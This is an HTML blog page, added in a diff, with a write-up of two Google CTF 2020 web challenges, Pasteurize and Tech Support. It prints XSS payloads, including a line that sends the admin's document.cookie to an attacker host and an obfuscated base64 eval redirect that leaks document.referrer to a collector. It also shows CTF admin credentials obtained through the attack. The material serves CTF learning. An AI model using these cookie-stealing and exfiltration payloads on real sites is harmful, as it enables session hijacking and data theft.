@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  <title>Blog | googleCTF2020 web challenges writeup</title>
+  <link rel="stylesheet" href="/blog/assets/css/mark.css" />
+  <link rel="stylesheet" href="/blog/assets/css/custom.css" />
+  <!-- PILL JS LOADER SYLE -->
+  <style>
+    #indicator {
+      position: fixed;
+      top: 0;
+      right: 0;
+      left: 0;
+      height: 3px;
+      display: none;
+      background-color: #72b6b5;
+    }
+
+    .is-loading {
+      display: block;
+      animation: blink 1.5s linear infinite;
+    }
+
+    @keyframes blink {
+      from,
+      to {
+        background-color: #72b6b5;
+      }
+
+      50% {
+        background-color: #42b983;
+      }
+    }
+
+    #project-link {
+      display: block;
+      position: fixed;
+      padding: 8px;
+      top: 0;
+      right: 0;
+    }
+  </style>
+  <!-- PILL JS -->
+  <script src="/blog/assets/js/pill.min.js"></script>
+  <script>
+    // this is for pill js as the normal link wont work
+    function openLink(url) {
+      window.open(url, "_blank");
+    }
+  </script>
+</head>
+
+  <body>
+    <div id="indicator"></div>
+    <div id="page">
+      <style>
+        .title {
+          padding: 10%;
+          color: #101417;
+          font-size: 18px;
+          font-weight: bold;
+          text-align: center;
+          background: #f78e66;
+          display: grid;
+        }
+        .meta {
+          font-size: 0.7rem;
+          font-weight: normal;
+          text-transform: uppercase;
+        }
+      </style>
+      <!-- header -->
+      <header>
+	<a href="/blog/">
+		<h3>Blog</h3>
+	</a>
+</header>
+
+      <!-- nav -->
+      <nav>
+	
+		
+			<a href="/blog/">Home</a>
+		
+	
+		
+			<a href="/blog/about">About</a>
+		
+	
+</nav>
+      <!-- page content -->
+      <main class="content">
+        <p class="title">
+          googleCTF2020 web challenges writeup <span class="meta">Written By pop_eax</span>
+        </p>
+        <h1 id="pasteurize">PASTEURIZE</h1>
+
+<p>this was the easiest web challenge in the CTF</p>
+
+<p><img src="https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/chall-info.png" alt="decription" /></p>
+
+<p>we have a paste sharing site</p>
+
+<p><img src="https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/main-site.png" alt="main" /></p>
+
+<p>sharing a paste, we find that we can share our pastes with the admin (TJMike)<br /></p>
+
+<p><img src="https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/paste.png" alt="paste" /></p>
+
+<p><em>interesting</em></p>
+
+<p>from what I have now, I can see that XSS is what I am supposed to look for
+<br />when testing for xss I always throw this payload to see how the sanitaization is being done</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<p>checking the source code verifies the input is getting sanitaizied</p>
+
+<p><br />while reading the source code I realized I missed that comment</p>
+
+<p><img src="https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/comment.png" alt="comment" /><br /></p>
+
+<p><img src="https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/source-code.png" alt="source-code" /></p>
+
+<p>looking at it I was able to verify that the sanitaization is only done on client side with DOMpurify</p>
+
+<p><img src="https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/dompurify.png" alt="DOMpurify" /></p>
+
+<p>I tried to bypass DOMpurify and read the source code, but that led to nothing since the version used in here is safe.</p>
+
+<p>at this point I thought to myself<br />
+DOMpurify shouldn’t be bypassed since it’s a really good project used everywhere
+and the high number of solves to the challenge doesn’t make me feel like we need to discover a 0day for such an easy challenge.<br /></p>
+
+<p>so I took it simply, and reviewd everything I have simply then an idea clicked in my mind</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">note</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">asdasd</span><span class="dl">"</span><span class="p">;</span>
+<span class="kd">const</span> <span class="nx">note_id</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">cb33322e-4b48-4d0f-a748-1e509be9645d</span><span class="dl">"</span><span class="p">;</span>
+<span class="kd">const</span> <span class="nx">note_el</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">note-content</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">note_url_el</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">note-title</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">clean</span> <span class="o">=</span> <span class="nx">DOMPurify</span><span class="p">.</span><span class="nx">sanitize</span><span class="p">(</span><span class="nx">note</span><span class="p">);</span>
+<span class="nx">note_el</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">clean</span><span class="p">;</span>
+<span class="nx">note_url_el</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="s2">`/</span><span class="p">${</span><span class="nx">note_id</span><span class="p">}</span><span class="s2">`</span><span class="p">;</span>
+<span class="nx">note_url_el</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">`</span><span class="p">${</span><span class="nx">note_id</span><span class="p">}</span><span class="s2">`</span><span class="p">;</span>
+</code></pre></div></div>
+<p>what if we put a <code class="highlighter-rouge">"</code> in our input and get a DOM based XSS</p>
+
+<p><img src="https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/escaped.png" alt="escaped" /></p>
+
+<p>aaand it’s getting escaped.<br /></p>
+
+<p><em>is that the end of it then ?</em><br />
+nope, it’s not I went back the server side source code and I saw something interesting</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Who wants a slice? */</span>
+<span class="kd">const</span> <span class="nx">escape_string</span> <span class="o">=</span> <span class="nx">unsafe</span> <span class="o">=&gt;</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">unsafe</span><span class="p">).</span><span class="nx">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+  <span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&lt;/g</span><span class="p">,</span> <span class="dl">'</span><span class="se">\\</span><span class="s1">x3C</span><span class="dl">'</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&gt;/g</span><span class="p">,</span> <span class="dl">'</span><span class="se">\\</span><span class="s1">x3E</span><span class="dl">'</span><span class="p">);</span>
+</code></pre></div></div>
+<p>the comment was interesting, when I first looked at it I felt like it’s a useless thing
+since it encodes the greater/less than signs.</p>
+
+<p>but the comment felt odd at this point, so I tried to play with the code locally.</p>
+
+<p><img src="https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/locally.png" alt="locally" /></p>
+
+<p>now I understood why the slice is important.
+I looked at examples online for JSON.stringify and saw that there’s only 1 case that doesn’t start with <code class="highlighter-rouge">"</code> which is when passing an object to it.</p>
+
+<p><img src="https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/object.png" alt="object" /></p>
+
+<p>I fired up burp suite and sent a json object and the quotes wasn’t there :( <br />
+that’s because my input is getting passed to the backend as a string not as an object</p>
+
+<p><img src="https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/req.png" alt="req" />
+<img src="https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/res.png" alt="res" /></p>
+
+<p>I did some research and then I remembered that I can send raw objects with <code class="highlighter-rouge">param[]=thing</code> in http.</p>
+
+<p><img src="https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/evil-req.png" alt="req" />
+<img src="https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/evil-res.png" alt="res" /></p>
+
+<p>DONE</p>
+
+<p>crafting this payload</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">content</span><span class="p">[]</span><span class="o">=</span><span class="p">;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="c1">//</span>
+</code></pre></div></div>
+
+<p><img src="https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/alert.png" alt="alert" />
+<img src="https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/alerted-source.png" alt="alerted-source" /></p>
+
+<p>now time to hack TJMike</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">content</span><span class="p">[]</span><span class="o">=</span><span class="p">;</span><span class="k">new</span> <span class="nx">Image</span><span class="p">().</span><span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://domain/</span><span class="dl">"</span><span class="o">+</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span><span class="c1">//</span>
+</code></pre></div></div>
+
+<p><img src="https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/flag.png" alt="flag" /></p>
+
+<hr />
+
+<h1 id="tech-support">TECH SUPPORT</h1>
+
+<p><img src="https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/tech-support/desc.png" alt="desc" /></p>
+
+<p>this challenge was fairly simple but it had a lot of rabbit holes which was really interesting.</p>
+
+<p>the app is a normal site with a admin chat service too
+so basically it’s xss</p>
+
+<p>we have the following features:</p>
+
+<p><img src="https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/tech-support/features.png" alt="features" /></p>
+
+<p>/flag</p>
+
+<p><img src="https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/tech-support/flag-thing.png" alt="flag-thing" /></p>
+
+<p>¯\_(ツ)_/¯</p>
+
+<p>/me (profile)</p>
+
+<p><img src="https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/tech-support/me.png" alt="me" /></p>
+
+<p>in here I updated the address with this payload</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<p>and it worked :) . <br />
+but that was so useless, since it’s a self XSS and by no way the admin can access it since the address value is stored in the cookies.</p>
+
+<p><strong>(╯°□°）╯︵ ┻━┻</strong></p>
+
+<p>/chat (the interesting thing)</p>
+
+<p><img src="https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/tech-support/chat.png" alt="chat" /></p>
+
+<p>now inputting the pervious payload didn’t really work
+so I tried this</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">X</span> <span class="na">onerror=</span><span class="s">alert(1)</span><span class="nt">&gt;</span>
+</code></pre></div></div>
+
+<p><em>isn’t this another self xss ?</em><br />
+I thought the same too don’t worry.</p>
+
+<p>after submitting the form I new window popped up, which felt interesting<br />
+<del>it’s literally useless btw</del></p>
+
+<p><img src="https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/tech-support/chat-window.png" alt="chat" /></p>
+
+<p>now I got a random thought of trying to send an legit image and to check who fetches it</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">domain.com</span><span class="nt">&gt;</span>
+</code></pre></div></div>
+
+<p>and I got 2 requests :)</p>
+
+<p><img src="https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/tech-support/reqs.png" alt="reqs" /></p>
+
+<p>at this point I tried to grab the /flag and send to my server and it didn’t work.<br />
+after researching it I realized it’s not working because the XSS is triggering on another domain which is typeselfsub.web.ctfcompetition.com . <br /></p>
+
+<p>at this point I was trying to do some weird magical stuff like SOP bypasses and I thought about redirecting to the self xss at my profile somehow <br /></p>
+
+<p><strong><em>all of that is useless</em></strong></p>
+
+<p>after sending a lot of requests I thought about leaking more info from what we have<br />
+so I started getting <code class="highlighter-rouge">document.thing</code> stuff and <code class="highlighter-rouge">document.referrer</code> returned something cool</p>
+
+<p>the payload</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">X</span> <span class="na">onerror=</span><span class="s">eval(atob("d2luZG93LmxvY2F0aW9uID0gImh0dHBzOi8veG9yZWF4LmZyZWUuYmVlY2VwdG9yLmNvbS9sZWFrP3E9IiArIGRvY3VtZW50LnJlZmVycmVy"))</span><span class="nt">&gt;</span>
+</code></pre></div></div>
+
+<p>spaces started messing, how the payload works so I base64 encoded it
+so I decoded it with <code class="highlighter-rouge">atob</code> and executed it with <code class="highlighter-rouge">eval</code>
+the decoded value</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">https://domain.com/leak?q=</span><span class="dl">"</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">referrer</span>
+</code></pre></div></div>
+
+<p>P.S: you can base64 encode in javascript with <code class="highlighter-rouge">btoa</code></p>
+
+<p>I got the following url from the bot</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://typeselfsub.web.ctfcompetition.com/asofdiyboxzdfasdfyryryryccc?username=mike&amp;password=j9as7ya7a3636ncvx&amp;reason={mypayload here}
+</code></pre></div></div>
+
+<p>then I went to that url and it auto logged me as admin :P</p>
+
+<p><img src="https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/tech-support/admin.png" alt="admin" /></p>
+
+<p>now going to /flag</p>
+
+<p><img src="https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/tech-support/flag.png" alt="flag" /></p>
+
+<p>and DONE</p>
+
+<h2 id="references">references</h2>
+
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/">xss</a><br />
+tool used to get http requests <a href="http://beeceptor.com/">beeceptor</a></p>
+
+      </main>
+
+      <!-- footer -->
+      <footer>
+	<p>
+		if I ain't popping these pills, I am popping some shells.
+	</p>
+	<p>
+		&copy 2020 | Blog
+	</p>
+</footer>
+<script src='/blog/assets/js/site.js' id="pill_site_script" type='module'></script>
+    </div>
+  </body>
+</html>
